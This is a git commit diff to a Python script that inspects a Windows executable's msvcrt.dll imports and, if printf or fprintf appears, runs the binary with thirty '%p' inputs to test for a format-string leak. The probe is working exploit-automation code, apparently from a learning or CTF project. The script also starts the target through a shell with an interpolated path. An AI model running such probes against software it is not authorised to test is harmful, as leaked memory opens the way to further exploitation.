a89fcaf5d5946042e4fe9aa7cc8a9b35bc11a539
haiderjirrie <haiderjirrie@gmail.com>
2024-05-21 23:51:42 -0700

    added %p string format automation

--- automation.py
+++ automation.py
@@ -1,4 +1,4 @@
-import sys, os, pefile
+import sys, os, subprocess, pefile
 
 target_path = ''
 
@@ -17,18 +17,42 @@ def validatePath():
 
     print("Target located")
 
-    #TO DO: create function that goes through the imports to determine which exploits are possible
+def changeWorkingDir():
+    pe_dir = os.path.dirname(target_path)
+    os.chdir(pe_dir)
+
+def stringFormatAttack():
+    print("Attempting string format attack")
+    
+    process = subprocess.Popen(f"\"{target_path}\"", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    input_str = " ".join(["%p"] * 30) + "\n"
+    output, error = process.communicate(input=input_str.encode())
+    
+    print(output)
+    if error:
+        print(error)
+
 
 def staticAnalysis():
     print("Analysing PE Imports")
 
-    pe =  pefile.PE(target_path)
+    pe = pefile.PE(target_path)
+    has_printf = False
+
     for entry in pe.DIRECTORY_ENTRY_IMPORT:
         if entry.dll.decode('utf-8').lower() == 'msvcrt.dll':
             print(f"{entry.dll.decode('utf-8')}:")
             for imp in entry.imports:
-                print(f"\t{imp.name.decode('utf-8') if imp.name else str(imp.ordinal)}")  
+                func_name = imp.name.decode('utf-8') if imp.name else str(imp.ordinal)
+                print(f"\t{func_name}")
+                if func_name == 'printf' or func_name == 'fprintf':
+                    has_printf = True
+    
+    if has_printf:
+        stringFormatAttack()
+    else:
+        print("No printf or fprintf found in imports.")
 
-# Call the functions
 validatePath()
+changeWorkingDir()
 staticAnalysis()
